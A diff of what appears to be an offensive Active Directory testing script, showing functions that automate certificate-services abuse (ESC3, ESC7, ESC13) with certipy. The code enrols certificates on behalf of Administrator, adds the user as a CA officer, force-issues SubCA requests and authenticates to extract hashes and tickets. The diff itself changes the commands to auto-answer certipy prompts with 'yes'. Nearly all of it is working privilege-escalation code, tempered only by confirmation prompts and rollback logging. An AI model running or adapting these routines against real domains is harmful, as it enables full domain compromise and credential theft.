@@ -22,7 +22,7 @@ set -o pipefail
 # ===========================================================================
 #  METADATA
 # ===========================================================================
-readonly VERSION="1.42.0"
+readonly VERSION="1.43.0"
 readonly AUTHOR="c4sh3r"
 KERBRUTE_BIN="${KERBRUTE_BIN:-/opt/kerbrute}"
 
@@ -3417,7 +3417,7 @@ _adcs_pwn_pfx() {                       # _adcs_pwn_pfx <pfx-basename> <label> [
     local pfx="$1" label="$2" selfok="${3:-0}"
     [[ -z "$pfx" || ! -f "$OUTDIR/$pfx" ]] && { warn "  ${label}: no certificate produced"; return 1; }
     run "certipy auth -pfx $pfx -dc-ip $DC_IP"
-    local aout; aout=$( cd "$OUTDIR" && "${_ADCS_ENV[@]}" timeout -k 15 "${CERTIPY_TO:-120}" certipy auth -pfx "$pfx" -dc-ip "$DC_IP" </dev/null 2>&1 ); echo "$aout" | tee -a "$LOGFILE"
+    local aout; aout=$( cd "$OUTDIR" && yes 2>/dev/null | "${_ADCS_ENV[@]}" timeout -k 15 "${CERTIPY_TO:-120}" certipy auth -pfx "$pfx" -dc-ip "$DC_IP" 2>&1 ); echo "$aout" | tee -a "$LOGFILE"
     # WHO did the cert actually authenticate as? (certipy may issue for the
     # requester, not the impersonated UPN, if the template forbids the SAN.)
     local who; who=$(grep -oiP "Got hash for '?\K[^'@ ]+" <<<"$aout" | head -1)
@@ -3477,13 +3477,13 @@ _adcs_req_admin() {                     # _adcs_req_admin <ca> <tpl> <label> <wi
 _adcs_esc3() {
     local ca="$1" agenttpl="$2"; _adcs_setauth
     abuse_confirm "  ESC3: use Enrollment Agent template '$agenttpl' to enrol on behalf of Administrator?" || return 1
-    local o1; o1=$( cd "$OUTDIR" && "${_ADCS_ENV[@]}" timeout -k 15 "${CERTIPY_TO:-120}" certipy req "${_ADCS_AUTH[@]}" -ca "$ca" -template "$agenttpl" \
-        -dc-ip "$DC_IP" -target "${DC_FQDN:-$DCT}" </dev/null 2>&1 ); echo "$o1" | tee -a "$LOGFILE"
+    local o1; o1=$( cd "$OUTDIR" && yes 2>/dev/null | "${_ADCS_ENV[@]}" timeout -k 15 "${CERTIPY_TO:-120}" certipy req "${_ADCS_AUTH[@]}" -ca "$ca" -template "$agenttpl" \
+        -dc-ip "$DC_IP" -target "${DC_FQDN:-$DCT}" 2>&1 ); echo "$o1" | tee -a "$LOGFILE"
     local agent; agent=$(grep -oiP "(?:Saving|Wrote) certificate and private key to '\K[^']+" <<<"$o1" | tail -1 | xargs -r basename)
     [[ -z "$agent" || ! -f "$OUTDIR/$agent" ]] && { warn "  ESC3: no enrollment-agent PFX produced"; return 1; }
-    local o2; o2=$( cd "$OUTDIR" && "${_ADCS_ENV[@]}" timeout -k 15 "${CERTIPY_TO:-120}" certipy req "${_ADCS_AUTH[@]}" -ca "$ca" -template User \
+    local o2; o2=$( cd "$OUTDIR" && yes 2>/dev/null | "${_ADCS_ENV[@]}" timeout -k 15 "${CERTIPY_TO:-120}" certipy req "${_ADCS_AUTH[@]}" -ca "$ca" -template User \
         -on-behalf-of "${DOMAIN%%.*}\\administrator" -pfx "$agent" \
-        -dc-ip "$DC_IP" -target "${DC_FQDN:-$DCT}" </dev/null 2>&1 ); echo "$o2" | tee -a "$LOGFILE"
+        -dc-ip "$DC_IP" -target "${DC_FQDN:-$DCT}" 2>&1 ); echo "$o2" | tee -a "$LOGFILE"
     local pfx; pfx=$(grep -oiP "(?:Saving|Wrote) certificate and private key to '\K[^']+" <<<"$o2" | tail -1 | xargs -r basename)
     _adcs_pwn_pfx "$pfx" "ESC3"
 }
@@ -3509,22 +3509,22 @@ _adcs_esc7() {
     ( cd "$OUTDIR" && "${_ADCS_ENV[@]}" timeout -k 15 "${CERTIPY_TO:-120}" certipy ca "${_ADCS_AUTH[@]}" -ca "$ca" -add-officer "$USER" -dc-ip "$DC_IP" 2>&1 ) | tee -a "$LOGFILE"
     rb_record "ESC7: added $USER as officer on CA $ca" "certipy ca -ca '$ca' -remove-officer '$USER' -dc-ip '$DC_IP'"
     ( cd "$OUTDIR" && "${_ADCS_ENV[@]}" timeout -k 15 "${CERTIPY_TO:-120}" certipy ca "${_ADCS_AUTH[@]}" -ca "$ca" -enable-template SubCA -dc-ip "$DC_IP" 2>&1 ) | tee -a "$LOGFILE"
-    local out; out=$( cd "$OUTDIR" && "${_ADCS_ENV[@]}" timeout -k 15 "${CERTIPY_TO:-120}" certipy req "${_ADCS_AUTH[@]}" -ca "$ca" -template SubCA \
-        -upn "administrator@${DOMAIN}" -dc-ip "$DC_IP" -target "${DC_FQDN:-$DCT}" </dev/null 2>&1 ); echo "$out" | tee -a "$LOGFILE"
+    local out; out=$( cd "$OUTDIR" && yes 2>/dev/null | "${_ADCS_ENV[@]}" timeout -k 15 "${CERTIPY_TO:-120}" certipy req "${_ADCS_AUTH[@]}" -ca "$ca" -template SubCA \
+        -upn "administrator@${DOMAIN}" -dc-ip "$DC_IP" -target "${DC_FQDN:-$DCT}" 2>&1 ); echo "$out" | tee -a "$LOGFILE"
     local rid; rid=$(grep -oiP 'request ID is\s*\K[0-9]+' <<<"$out" | head -1)
     if [[ -z "$rid" ]]; then
         _adcs_pwn_pfx "$(grep -oiP "(?:Saving|Wrote) certificate and private key to '\K[^']+" <<<"$out" | tail -1 | xargs -r basename)" "ESC7"; return $?
     fi
-    ( cd "$OUTDIR" && "${_ADCS_ENV[@]}" timeout -k 15 "${CERTIPY_TO:-120}" certipy ca "${_ADCS_AUTH[@]}" -ca "$ca" -issue-request "$rid" -dc-ip "$DC_IP" </dev/null 2>&1 ) | tee -a "$LOGFILE"
-    local r2; r2=$( cd "$OUTDIR" && "${_ADCS_ENV[@]}" timeout -k 15 "${CERTIPY_TO:-120}" certipy req "${_ADCS_AUTH[@]}" -ca "$ca" -retrieve "$rid" -dc-ip "$DC_IP" -target "${DC_FQDN:-$DCT}" </dev/null 2>&1 ); echo "$r2" | tee -a "$LOGFILE"
+    ( cd "$OUTDIR" && yes 2>/dev/null | "${_ADCS_ENV[@]}" timeout -k 15 "${CERTIPY_TO:-120}" certipy ca "${_ADCS_AUTH[@]}" -ca "$ca" -issue-request "$rid" -dc-ip "$DC_IP" 2>&1 ) | tee -a "$LOGFILE"
+    local r2; r2=$( cd "$OUTDIR" && yes 2>/dev/null | "${_ADCS_ENV[@]}" timeout -k 15 "${CERTIPY_TO:-120}" certipy req "${_ADCS_AUTH[@]}" -ca "$ca" -retrieve "$rid" -dc-ip "$DC_IP" -target "${DC_FQDN:-$DCT}" 2>&1 ); echo "$r2" | tee -a "$LOGFILE"
     _adcs_pwn_pfx "$(grep -oiP "(?:Saving|Wrote) certificate and private key to '\K[^']+" <<<"$r2" | tail -1 | xargs -r basename)" "ESC7"
 }
 # ESC13 — issuance policy linked to a group: enrol, auth → TGT carries that group.
 _adcs_esc13() {
     local ca="$1" tpl="$2"; _adcs_setauth
     abuse_confirm "  ESC13: enrol template '$tpl' to inherit its linked (privileged) group?" || return 1
-    local out; out=$( cd "$OUTDIR" && "${_ADCS_ENV[@]}" timeout -k 15 "${CERTIPY_TO:-120}" certipy req "${_ADCS_AUTH[@]}" -ca "$ca" -template "$tpl" \
-        -dc-ip "$DC_IP" -target "${DC_FQDN:-$DCT}" </dev/null 2>&1 ); echo "$out" | tee -a "$LOGFILE"
+    local out; out=$( cd "$OUTDIR" && yes 2>/dev/null | "${_ADCS_ENV[@]}" timeout -k 15 "${CERTIPY_TO:-120}" certipy req "${_ADCS_AUTH[@]}" -ca "$ca" -template "$tpl" \
+        -dc-ip "$DC_IP" -target "${DC_FQDN:-$DCT}" 2>&1 ); echo "$out" | tee -a "$LOGFILE"
     local pfx; pfx=$(grep -oiP "(?:Saving|Wrote) certificate and private key to '\K[^']+" <<<"$out" | tail -1 | xargs -r basename)
     _adcs_pwn_pfx "$pfx" "ESC13" 1   # self hash/TGT is fine — it now carries the linked group
 }
